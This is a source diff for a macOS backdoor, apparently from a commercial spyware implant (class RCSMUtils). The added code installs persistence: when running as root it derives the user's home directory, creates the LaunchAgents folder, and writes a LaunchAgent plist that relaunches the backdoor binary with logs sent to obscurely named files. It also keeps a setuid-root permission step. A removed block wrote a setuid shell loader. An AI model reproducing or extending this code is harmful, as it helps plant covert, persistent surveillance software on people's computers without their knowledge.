@@ -271,6 +271,7 @@ static RCSMUtils *sharedUtils = nil;
        withArguments: _tempArguments
         waitUntilEnd: YES];
   
+  [_tempArguments release];
   return YES;
 }
 
@@ -322,17 +323,73 @@ static RCSMUtils *sharedUtils = nil;
 {
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
   NSDictionary *innerDict;
+  NSString *userHome;
   
+  if (getuid() == 0)
+    {
+      //
+      // if we've been correctly executed from /Users/<user>/Library/Preferences
+      // we can safely obtain the user home from our current path
+      // if not just use NSHomeDirectory()
+      //
+      if ([[[NSBundle mainBundle] bundlePath]
+          rangeOfString: @"/Library/Preferences"].location != NSNotFound
+          && [[[NSBundle mainBundle] bundlePath]
+          rangeOfString: @"/Users/"].location != NSNotFound)
+        {
+          userHome = [NSString stringWithString:
+            [[[[[NSBundle mainBundle] bundlePath]
+            stringByDeletingLastPathComponent]
+            stringByDeletingLastPathComponent]
+            stringByDeletingLastPathComponent]];
+        }
+      else
+        {
+#ifdef DEBUG_UTILS
+          errorLog(@"Error, run the backdoor from the correct path");
+#endif
+
+          return NO;
+        }
+    }
+  else
+    {
+      userHome = NSHomeDirectory(); 
+    }
+
   NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                        NSHomeDirectory(),
+                        userHome,
                         BACKDOOR_DAEMON_PLIST];
+  NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
+           userHome];
+
+  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentsPath] == NO)
+    {
+#ifdef DEBUG_UTILS
+      warnLog(@"LaunchAgents path doesn't exists yet, creating");
+#endif
+
+      if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
+        {
+#ifdef DEBUG_UTILS
+          errorLog(@"Error mkdir LaunchAgents (%d)", errno);
+#endif
+          return NO;
+        }
+    }
   
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
+  NSString *errorLog = [NSString stringWithFormat: @"%@/ji33", mBackdoorPath];
+  NSString *outLog   = [NSString stringWithFormat: @"%@/ji34", mBackdoorPath];
+
   innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
                aLabel, @"Label",
                @"Aqua", @"LimitLoadToSessionType",
                [NSNumber numberWithBool: FALSE], @"OnDemand",
-               [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments", nil];
+               [NSArray arrayWithObjects: backdoorPath, nil], @"ProgramArguments",
+               errorLog, @"StandardErrorPath",
+               outLog, @"StandardOutPath",
+               nil];
                //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
   
   [rootObj addEntriesFromDictionary: innerDict];
@@ -341,30 +398,7 @@ static RCSMUtils *sharedUtils = nil;
   return [self saveSLIPlist: rootObj
                      atPath: ourPlist];
 }
-#if 0
-- (BOOL)createBackdoorLoader
-{
-  NSString *myData = [NSString stringWithFormat:
-                      @"#!/bin/bash\n cd %@\n %@ &\n",
-                      [[NSBundle mainBundle] bundlePath],
-                      [[NSBundle mainBundle] executablePath]];
-                      //@"#!/bin/bash\n %@\n", mBackdoorPath];
-  
-  BOOL success = [myData writeToFile: mServiceLoaderPath
-                          atomically: NO
-                            encoding: NSASCIIStringEncoding
-                               error: nil];
-  
-  if ([self makeSuidBinary: mServiceLoaderPath] == NO)
-    {
-#ifdef DEBUG_UTILS
-      NSLog(@"[makeSuidBinary] %@ - not enough privileges", mServiceLoaderPath);
-#endif
-    }
-  
-  return success;
-}
-#endif
+
 - (BOOL)isBackdoorPresentInSLI: (NSString *)aKey
 {
   return [self searchSLIPlistForKey: aKey];
@@ -408,7 +442,6 @@ static RCSMUtils *sharedUtils = nil;
   //
   if (gOSMajor == 10 && (gOSMinor == 5 || gOSMinor == 6))
     {
-      //[self enableSetugidAuth];
       u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
       NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
       NSValue *owner      = [NSNumber numberWithInt: 0];
